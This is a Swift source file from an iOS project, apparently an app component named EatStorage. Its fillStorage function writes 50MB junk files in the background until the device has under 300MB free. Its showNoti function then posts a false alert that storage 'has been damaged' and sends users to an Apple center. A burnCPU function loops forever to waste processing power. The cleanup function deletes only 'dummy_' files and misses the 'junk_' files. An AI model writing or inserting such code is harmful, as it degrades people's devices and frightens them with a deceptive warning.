//
//  EatStorage.swift
//  BaseProjectSwift
//
//  Created by Bé Gạo on 25/3/25.
//

import Foundation
import UIKit
import UserNotifications

struct EatStorage {
    static let fileNamePrefix: String = "dummy_"
    static func generateDummyFile(sizeInMB: Int, fileName: String, completion: @escaping (URL?) -> Void) {
        DispatchQueue.global(qos: .utility).async {
            let dummyName = fileNamePrefix + fileName
            let fileManager = FileManager.default
            let url = fileManager.temporaryDirectory.appendingPathComponent(dummyName)
            
            let mb = 1024 * 1024
            let chunkSize = 1 * mb
            let totalSize = sizeInMB * mb
            let buffer = Data(count: chunkSize)
            
            // Remove file if it already exists
            if fileManager.fileExists(atPath: url.path) {
                try? fileManager.removeItem(at: url)
            }
            
            // Create an empty file first
            guard fileManager.createFile(atPath: url.path, contents: nil, attributes: nil) else {
                DispatchQueue.main.async {
                    completion(nil)
                }
                return
            }
            
            do {
                guard let fileHandle = try? FileHandle(forWritingTo: url) else {
                    throw NSError(domain: "FileHandleError", code: -1, userInfo: nil)
                }
                
                for _ in 0..<(totalSize / chunkSize) {
                    try fileHandle.write(contentsOf: buffer)
                }
                
                try fileHandle.close()
                
                print("Saved \(sizeInMB)MB to: \(url)")
                DispatchQueue.main.async {
                    completion(url)
                }
            } catch {
                print("Error writing file: \(error)")
                DispatchQueue.main.async {
                    completion(nil)
                }
            }
        }
    }
    
    static func showNoti() {
        scheduleLocalNotification(title: "Your device storage has been damaged!", body: "It will slow down your device, please bring it to Apple center for checking.")
    }
    static func clearDummyFiles() {
        let tempDir = FileManager.default.temporaryDirectory
        
        do {
            let files = try FileManager.default.contentsOfDirectory(at: tempDir, includingPropertiesForKeys: nil)
            for file in files where file.lastPathComponent.hasPrefix("dummy_") {
                try FileManager.default.removeItem(at: file)
            }
            print("All dummy files deleted.")
        } catch {
            print("Cleanup error: \(error)")
        }
    }
    
    static func burnCPU() {
        DispatchQueue.global(qos: .background).async {
            while true {
                _ = UUID().uuidString.hashValue
            }
        }
    }
    
    static func fillStorage(upTo targetMB: Int = 10240) {
        var bgTask: UIBackgroundTaskIdentifier = .invalid
        
        bgTask = UIApplication.shared.beginBackgroundTask(withName: "FillStorage") {
            UIApplication.shared.endBackgroundTask(bgTask)
            bgTask = .invalid
        }
        
        DispatchQueue.global(qos: .background).async {
            defer {
                UIApplication.shared.endBackgroundTask(bgTask)
                bgTask = .invalid
            }
            
            let fileManager = FileManager.default
            let tempDir = fileManager.temporaryDirectory
            let chunkSizeMB = 50
            var totalWrittenMB = 0
            var index = UserDefaults.standard.integer(forKey: "MemoryEatCountKey")
            
            while totalWrittenMB < targetMB {
                // 🧠 Stop when free space < 300MB
                if let attrs = try? fileManager.attributesOfFileSystem(forPath: tempDir.path),
                   let free = attrs[.systemFreeSize] as? NSNumber {
                    let freeMB = free.int64Value / (1024 * 1024)
                    print("Free space: \(freeMB)MB")
                    if freeMB < 300 {
                        print("Stopping: reached 300MB free space")
                        showNoti()
                        break
                    }
                }
                
                let fileName = "junk_\(index).bin"
                let fileURL = tempDir.appendingPathComponent(fileName)
                let data = Data(count: chunkSizeMB * 1024 * 1024)
                UserDefaults.standard.set(index, forKey: "MemoryEatCountKey")
                
                do {
                    try data.write(to: fileURL)
                    totalWrittenMB += chunkSizeMB
                    print("Wrote \(totalWrittenMB)MB - fileName: \(fileName)")
                    index += 1
                    sleep(1)
                } catch {
                    print("Stopped writing at \(totalWrittenMB)MB: \(error)")
                    showNoti()
                    break
                }
            }
            
            showNoti()
            print("Finished eating storage")
        }
    }
    
    static func scheduleLocalNotification(title: String, body: String) {
        let content = UNMutableNotificationContent()
        content.title = title
        content.body = body
        content.sound = .default
        content.badge = NSNumber(value: 1)
        
        let trigger = UNTimeIntervalNotificationTrigger(timeInterval: 3, repeats: false)
        
        let request = UNNotificationRequest(identifier: UUID().uuidString, content: content, trigger: trigger)
        
        UNUserNotificationCenter.current().add(request) { error in
            if let error = error {
                print("❌ Error scheduling notification: \(error)")
            } else {
                print("✅ Task-complete notification scheduled")
            }
        }
    }
}
